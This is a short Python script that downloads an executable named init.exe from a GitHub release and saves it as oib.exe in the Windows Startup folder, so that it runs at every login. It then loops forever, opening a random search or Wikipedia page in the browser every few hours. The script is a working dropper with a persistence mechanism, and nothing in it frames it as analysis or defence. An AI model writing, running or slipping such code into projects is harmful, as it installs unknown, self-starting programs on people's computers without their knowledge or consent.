import webbrowser
import random
import time
import os
import appdirs
import requests


def main():
    startup = appdirs.user_data_dir() + "\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    fil = requests.get("https://github.com/Can202/testt/releases/download/test/init.exe")
    with open(startup + "\\oib.exe", 'wb') as f:
        f.write(fil.content)
    
    while True:

        wait = random.randrange(4000, 8000)
        time.sleep(wait)
        webbrowser.open(randomlink(), new=2)

def randomlink() -> str:
    links = [
        "https://www.google.com/",
        "https://www.yahoo.com/",
        "https://www.ecosia.org/",
        "https://www.wikipedia.org/"
    ]
    return links[random.randrange(len(links))]

if __name__ == '__main__':
    main()